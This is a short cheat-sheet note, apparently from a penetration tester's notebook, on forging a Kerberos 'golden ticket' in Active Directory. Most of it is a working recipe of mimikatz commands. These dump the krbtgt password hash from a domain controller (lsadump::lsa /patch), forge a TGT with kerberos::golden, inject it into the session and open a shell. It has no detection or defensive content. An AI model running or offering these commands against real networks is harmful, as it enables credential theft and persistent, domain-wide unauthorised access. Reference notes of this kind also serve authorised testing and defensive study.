---
id: Golden Ticket
aliases:
  - Golden Ticket
tags:
  - windows
  - AD
  - kerberos
  - lateral
  - persistence
---
Create a custom TGT (= golden ticket) with the `krbtgt` password hash.

Golden tickets grant unlimited and persistent access to AD resources.

## With mimikatz.exe

1. On DC, dump krbtgt hash:
```mimikatz
privilege::debug
lsadump::lsa /patch
```

2. On any machine, create a TGT with the krbtgt hash:
```mimikatz
kerberos::purge
kerberos::golden /user:$USER /domain:$DOMAIN /sid:$DOM_SID /krbtgt:$HASH /ptt
misc::cmd
```
